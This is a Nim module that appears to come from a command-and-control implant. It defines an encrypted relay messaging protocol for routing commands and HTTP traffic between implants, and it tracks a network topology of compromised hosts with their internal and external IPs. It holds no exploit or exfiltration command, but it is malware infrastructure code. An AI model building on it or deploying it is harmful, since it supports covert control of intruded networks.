import json, times, strutils, tables, random, net
import ../../util/crypto
import relay_config

# Message types for relay communication
type
    RelayMessageType* = enum
        REGISTER = "register"
        PULL = "pull"
        COMMAND = "command"
        RESPONSE = "response"
        FORWARD = "forward"
        HTTP_REQUEST = "http_request"
        HTTP_RESPONSE = "http_response"
        TOPOLOGY_UPDATE = "topology_update"
        TOPOLOGY_REQUEST = "topology_request"
        TOPOLOGY_RESPONSE = "topology_response"

    RelayMessage* = object
        msgType*: RelayMessageType
        fromID*: string
        route*: seq[string]
        id*: string
        payload*: string
        timestamp*: int64

    RelayImplant* = object
        id*: string
        isRelay*: bool
        upstreamHost*: string
        upstreamPort*: int
        downstreamPort*: int
        cryptoKey*: string
        registeredImplants*: Table[string, ImplantInfo]
        messageQueue*: seq[RelayMessage]
        isListening*: bool
        isConnected*: bool

    ImplantInfo* = object
        id*: string
        lastSeen*: int64
        route*: seq[string]

    # Topology data structures
    RelayNodeInfo* = object
        nodeID*: string
        nodeType*: string  # "relay_server", "relay_client", "hybrid"
        hostname*: string
        ipExternal*: string
        ipInternal*: string
        listeningPort*: int  # 0 if not a server
        upstreamHost*: string
        upstreamPort*: int
        directChildren*: seq[string]  # Direct child node IDs
        lastSeen*: int64

    TopologyInfo* = object
        rootNodeID*: string
        nodes*: Table[string, RelayNodeInfo]
        lastUpdated*: int64

# Generate unique message ID
proc generateMessageID*(): string =
    randomize()
    result = $rand(1000000000..1999999999) & $epochTime().int64

# Serialize RelayMessage to JSON string
proc serialize*(msg: RelayMessage): string =
    let jsonObj = %*{
        "msgType": $msg.msgType,
        "fromID": msg.fromID,
        "route": msg.route,
        "id": msg.id,
        "payload": msg.payload,
        "timestamp": msg.timestamp
    }
    result = $jsonObj

# Deserialize JSON string to RelayMessage
proc deserialize*(jsonStr: string): RelayMessage =
    let jsonObj = parseJson(jsonStr)
    result.msgType = parseEnum[RelayMessageType](jsonObj["msgType"].getStr())
    result.fromID = jsonObj["fromID"].getStr()
    result.route = @[]
    for item in jsonObj["route"].getElems():
        result.route.add(item.getStr())
    result.id = jsonObj["id"].getStr()
    result.payload = jsonObj["payload"].getStr()
    result.timestamp = jsonObj["timestamp"].getInt()

# Encrypt payload using per-implant derived key
proc encryptPayload*(data: string, implantID: string): string =
    let implantKey = getImplantKey(implantID)
    result = encryptData(data, implantKey)

# Decrypt payload using per-implant derived key
proc decryptPayload*(encryptedData: string, implantID: string): string =
    let implantKey = getImplantKey(implantID)
    result = decryptData(encryptedData, implantKey)

# Create a new RelayMessage with per-implant encryption
proc createMessage*(msgType: RelayMessageType, fromID: string, route: seq[string], 
                   payload: string): RelayMessage =
    result.msgType = msgType
    result.fromID = fromID
    result.route = route
    result.id = generateMessageID()
    result.payload = encryptPayload(payload, fromID)  # Use sender's ID for key derivation
    result.timestamp = epochTime().int64

# Create REGISTER message
proc createRegisterMessage*(implantID: string, route: seq[string]): RelayMessage =
    let registerData = %*{
        "implantID": implantID,
        "timestamp": epochTime().int64,
        "capabilities": ["relay", "client"]
    }
    result = createMessage(REGISTER, implantID, route, $registerData)

# Create PULL message
proc createPullMessage*(implantID: string, route: seq[string]): RelayMessage =
    let pullData = %*{
        "implantID": implantID,
        "timestamp": epochTime().int64
    }
    result = createMessage(PULL, implantID, route, $pullData)

# Create HTTP_REQUEST message
proc createHttpRequestMessage*(fromID: string, route: seq[string], 
                              httpMethod: string, path: string, headers: seq[(string, string)], 
                              body: string = ""): RelayMessage =
    # Convert headers to JSON-compatible format
    var headerObj = newJObject()
    for (key, value) in headers:
        headerObj[key] = %value
    
    let httpData = %*{
        "method": httpMethod,
        "path": path,
        "headers": headerObj,
        "body": body,
        "timestamp": epochTime().int64
    }
    result = createMessage(HTTP_REQUEST, fromID, route, $httpData)

# Create HTTP_RESPONSE message (simplified version with JSON payload)
proc createHttpResponseMessage*(fromID: string, route: seq[string], 
                               responseJson: string): RelayMessage =
    result = createMessage(HTTP_RESPONSE, fromID, route, responseJson)

# Create TOPOLOGY_UPDATE message
proc createTopologyUpdateMessage*(fromID: string, route: seq[string], 
                                 eventType: string, nodeInfo: RelayNodeInfo): RelayMessage =
    let topologyData = %*{
        "eventType": eventType,  # "node_connected", "node_disconnected", "topology_changed"
        "nodeInfo": {
            "nodeID": nodeInfo.nodeID,
            "nodeType": nodeInfo.nodeType,
            "hostname": nodeInfo.hostname,
            "ipExternal": nodeInfo.ipExternal,
            "ipInternal": nodeInfo.ipInternal,
            "listeningPort": nodeInfo.listeningPort,
            "upstreamHost": nodeInfo.upstreamHost,
            "upstreamPort": nodeInfo.upstreamPort,
            "directChildren": nodeInfo.directChildren,
            "lastSeen": nodeInfo.lastSeen
        },
        "timestamp": epochTime().int64
    }
    result = createMessage(TOPOLOGY_UPDATE, fromID, route, $topologyData)

# Create TOPOLOGY_REQUEST message
proc createTopologyRequestMessage*(fromID: string, route: seq[string]): RelayMessage =
    let requestData = %*{
        "requestType": "full_topology",
        "timestamp": epochTime().int64
    }
    result = createMessage(TOPOLOGY_REQUEST, fromID, route, $requestData)

# Create TOPOLOGY_RESPONSE message
proc createTopologyResponseMessage*(fromID: string, route: seq[string], 
                                   topology: TopologyInfo): RelayMessage =
    # Convert topology to JSON
    var nodesJson = newJObject()
    for nodeID, nodeInfo in topology.nodes:
        nodesJson[nodeID] = %*{
            "nodeID": nodeInfo.nodeID,
            "nodeType": nodeInfo.nodeType,
            "hostname": nodeInfo.hostname,
            "ipExternal": nodeInfo.ipExternal,
            "ipInternal": nodeInfo.ipInternal,
            "listeningPort": nodeInfo.listeningPort,
            "upstreamHost": nodeInfo.upstreamHost,
            "upstreamPort": nodeInfo.upstreamPort,
            "directChildren": nodeInfo.directChildren,
            "lastSeen": nodeInfo.lastSeen
        }
    
    let topologyData = %*{
        "rootNodeID": topology.rootNodeID,
        "nodes": nodesJson,
        "lastUpdated": topology.lastUpdated,
        "timestamp": epochTime().int64
    }
    result = createMessage(TOPOLOGY_RESPONSE, fromID, route, $topologyData)

# Initialize relay implant
proc initRelayImplant*(implantID: string): RelayImplant =
    result.id = implantID
    result.isRelay = false
    result.upstreamHost = ""
    result.upstreamPort = 0
    result.downstreamPort = 0
    result.cryptoKey = getImplantKey(implantID)  # Use derived key
    result.registeredImplants = initTable[string, ImplantInfo]()
    result.messageQueue = @[]
    result.isListening = false
    result.isConnected = false

# Create RelayNodeInfo from system information
proc createRelayNodeInfo*(nodeID: string, nodeType: string, hostname: string = "", 
                         ipExternal: string = "", ipInternal: string = "",
                         listeningPort: int = 0, upstreamHost: string = "", 
                         upstreamPort: int = 0): RelayNodeInfo =
    result.nodeID = nodeID
    result.nodeType = nodeType
    result.hostname = hostname
    result.ipExternal = ipExternal
    result.ipInternal = ipInternal
    result.listeningPort = listeningPort
    result.upstreamHost = upstreamHost
    result.upstreamPort = upstreamPort
    result.directChildren = @[]
    result.lastSeen = epochTime().int64

# Initialize empty topology
proc initTopologyInfo*(rootNodeID: string): TopologyInfo =
    result.rootNodeID = rootNodeID
    result.nodes = initTable[string, RelayNodeInfo]()
    result.lastUpdated = epochTime().int64

# Add or update node in topology
proc updateNodeInTopology*(topology: var TopologyInfo, nodeInfo: RelayNodeInfo) =
    topology.nodes[nodeInfo.nodeID] = nodeInfo
    topology.lastUpdated = epochTime().int64

# Remove node from topology
proc removeNodeFromTopology*(topology: var TopologyInfo, nodeID: string) =
    if topology.nodes.hasKey(nodeID):
        # Remove this node from any parent's children list
        for parentID, parentInfo in topology.nodes.mpairs:
            let index = parentInfo.directChildren.find(nodeID)
            if index >= 0:
                parentInfo.directChildren.delete(index)
        
        # Remove the node itself
        topology.nodes.del(nodeID)
        topology.lastUpdated = epochTime().int64

# Add child relationship
proc addChildToNode*(topology: var TopologyInfo, parentID: string, childID: string) =
    if topology.nodes.hasKey(parentID):
        if childID notin topology.nodes[parentID].directChildren:
            topology.nodes[parentID].directChildren.add(childID)
            topology.lastUpdated = epochTime().int64

# Parse topology update from JSON payload
proc parseTopologyUpdate*(payload: string): (string, RelayNodeInfo) =
    let jsonObj = parseJson(payload)
    let eventType = jsonObj["eventType"].getStr()
    let nodeInfoJson = jsonObj["nodeInfo"]
    
    var nodeInfo: RelayNodeInfo
    nodeInfo.nodeID = nodeInfoJson["nodeID"].getStr()
    nodeInfo.nodeType = nodeInfoJson["nodeType"].getStr()
    nodeInfo.hostname = nodeInfoJson["hostname"].getStr()
    nodeInfo.ipExternal = nodeInfoJson["ipExternal"].getStr()
    nodeInfo.ipInternal = nodeInfoJson["ipInternal"].getStr()
    nodeInfo.listeningPort = nodeInfoJson["listeningPort"].getInt()
    nodeInfo.upstreamHost = nodeInfoJson["upstreamHost"].getStr()
    nodeInfo.upstreamPort = nodeInfoJson["upstreamPort"].getInt()
    nodeInfo.lastSeen = nodeInfoJson["lastSeen"].getInt()
    
    # Parse children array
    nodeInfo.directChildren = @[]
    for child in nodeInfoJson["directChildren"].getElems():
        nodeInfo.directChildren.add(child.getStr())
    
    result = (eventType, nodeInfo)

# Parse topology response from JSON payload
proc parseTopologyResponse*(payload: string): TopologyInfo =
    let jsonObj = parseJson(payload)
    result.rootNodeID = jsonObj["rootNodeID"].getStr()
    result.lastUpdated = jsonObj["lastUpdated"].getInt()
    result.nodes = initTable[string, RelayNodeInfo]()
    
    let nodesJson = jsonObj["nodes"]
    for nodeID, nodeInfoJson in nodesJson:
        var nodeInfo: RelayNodeInfo
        nodeInfo.nodeID = nodeInfoJson["nodeID"].getStr()
        nodeInfo.nodeType = nodeInfoJson["nodeType"].getStr()
        nodeInfo.hostname = nodeInfoJson["hostname"].getStr()
        nodeInfo.ipExternal = nodeInfoJson["ipExternal"].getStr()
        nodeInfo.ipInternal = nodeInfoJson["ipInternal"].getStr()
        nodeInfo.listeningPort = nodeInfoJson["listeningPort"].getInt()
        nodeInfo.upstreamHost = nodeInfoJson["upstreamHost"].getStr()
        nodeInfo.upstreamPort = nodeInfoJson["upstreamPort"].getInt()
        nodeInfo.lastSeen = nodeInfoJson["lastSeen"].getInt()
        
        # Parse children array
        nodeInfo.directChildren = @[]
        for child in nodeInfoJson["directChildren"].getElems():
            nodeInfo.directChildren.add(child.getStr())
        
        result.nodes[nodeID] = nodeInfo

# Validate message integrity
proc validateMessage*(msg: RelayMessage): bool =
    result = msg.id != "" and msg.fromID != "" and msg.route.len > 0 and 
             msg.timestamp > 0 and msg.payload != "" 